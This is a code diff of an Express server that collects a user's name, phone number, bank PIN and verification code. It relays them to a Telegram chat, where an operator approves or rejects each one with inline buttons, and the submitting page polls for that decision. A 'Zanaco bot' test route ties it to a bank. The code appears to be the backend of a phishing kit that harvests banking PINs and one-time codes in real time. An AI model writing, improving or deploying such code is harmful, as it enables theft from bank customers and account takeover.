@@ -14,19 +14,29 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
+// Read Telegram info from .env
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
+if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.error('❌ Missing Telegram bot token or chat ID in .env');
+    process.exit(1);
+}
+
 // ---------------- TELEGRAM HELPERS ----------------
-async function sendTelegramMessage(text, inlineKeyboard) {
+async function sendTelegramMessage(text, inlineKeyboard = []) {
     try {
         await axios.post(
             `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-            { chat_id: TELEGRAM_CHAT_ID, text, reply_markup: { inline_keyboard: inlineKeyboard } }
+            {
+                chat_id: TELEGRAM_CHAT_ID,
+                text,
+                reply_markup: { inline_keyboard: inlineKeyboard }
+            }
         );
         console.log('✅ Telegram message sent');
     } catch (err) {
-        console.error('❌ Telegram error:', err.message);
+        console.error('❌ Telegram error:', err.response?.data || err.message);
     }
 }
 
@@ -38,7 +48,7 @@ async function answerCallback(callbackId) {
         );
         console.log('✅ Answered callback:', callbackId);
     } catch (err) {
-        console.error('❌ Callback error:', err.message);
+        console.error('❌ Callback error:', err.response?.data || err.message);
     }
 }
 
@@ -46,7 +56,7 @@ async function answerCallback(callbackId) {
 
 // PIN submit
 app.post('/submit-pin', (req, res) => {
-    const { name = 'TestUser', phone = '0712345678', pin } = req.body; // fallback values
+    const { name = 'TestUser', phone = '0712345678', pin } = req.body;
     const requestId = uuidv4();
 
     console.log('📩 PIN received:', { name, phone, pin, requestId });
@@ -66,7 +76,6 @@ app.post('/submit-pin', (req, res) => {
 // PIN check
 app.get('/check-pin/:requestId', (req, res) => {
     const requestId = req.params.requestId;
-    console.log(`Checking PIN approval for requestId: ${requestId}`, approvedPins[requestId]);
     res.json({ approved: approvedPins[requestId] ?? null });
 });
 
@@ -92,39 +101,33 @@ app.post('/submit-code', (req, res) => {
 // CODE check
 app.get('/check-code/:requestId', (req, res) => {
     const requestId = req.params.requestId;
-    console.log(`Checking CODE approval for requestId: ${requestId}`, approvedCodes[requestId]);
     res.json({ approved: approvedCodes[requestId] ?? null });
 });
 
 // ---------------- TELEGRAM WEBHOOK ----------------
 app.post('/telegram-webhook', async (req, res) => {
-    console.log('🔔 Telegram webhook hit!');
-    console.log('Payload:', JSON.stringify(req.body, null, 2));
-
     const cb = req.body.callback_query;
-    if (!cb) {
-        console.log('⚠️ No callback_query in request');
-        return res.sendStatus(200);
-    }
+    if (!cb) return res.sendStatus(200);
 
     const [action, requestId] = cb.data.split(':');
-    console.log('Callback action:', action, 'Request ID:', requestId);
 
-    // Update approval states
     if (action === 'pin_ok') approvedPins[requestId] = true;
     if (action === 'pin_bad') approvedPins[requestId] = false;
     if (action === 'code_ok') approvedCodes[requestId] = true;
     if (action === 'code_bad') approvedCodes[requestId] = false;
 
     await answerCallback(cb.id);
-    console.log('✅ Callback processed, current states:', {
-        approvedPins,
-        approvedCodes
-    });
 
     res.sendStatus(200);
 });
 
+// ---------------- TEST ROUTE ----------------
+app.get('/test-bot', async (req, res) => {
+    await sendTelegramMessage('🤖 Test message from Zanaco bot!');
+    res.send('✅ Test message sent! Check Telegram.');
+});
+
+// ---------------- START SERVER ----------------
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
 });
